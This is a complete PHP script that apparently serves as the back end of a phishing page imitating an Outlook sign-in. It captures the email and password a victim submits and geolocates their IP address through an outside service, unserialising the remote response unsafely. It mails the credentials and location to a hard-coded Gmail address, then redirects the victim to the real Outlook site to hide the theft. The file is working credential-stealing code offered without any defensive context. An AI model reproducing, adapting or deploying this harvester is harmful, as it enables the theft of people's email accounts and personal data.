<?php
$ip_address = getenv("REMOTE_ADDR");
$geopluginURL = 'http://www.geoplugin.net/php.gp?ip='.$ip_address;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
$city = $addrDetailsArr['geoplugin_city']; 
$country = $addrDetailsArr['geoplugin_countryName'];
$email=$_POST['email'];
$pass=$_POST['passwd'];
$message = "Sign In\n";
$message .= "Email= $email\n";
$message .= "Pass= $pass\n";
$message .= "IP= $ip_address\n";
$message .= "City=$city\n";
$message .= "Country=$country\n";
$send = "poshrozay@gmail.com";
$subject = "Europe! | $country"; 
$headers = "From: EDIT BY DAR"; 
$headers .= $_POST['emailAdd']."\n"; 
$headers .= "MIME-Version:1.0\r\n"; 
$arr=array($send, $ip_address); 
foreach ($arr as $send) 
mail($send,$subject,$message,$headers);
header("Location: http://outlook.live.com/");
?>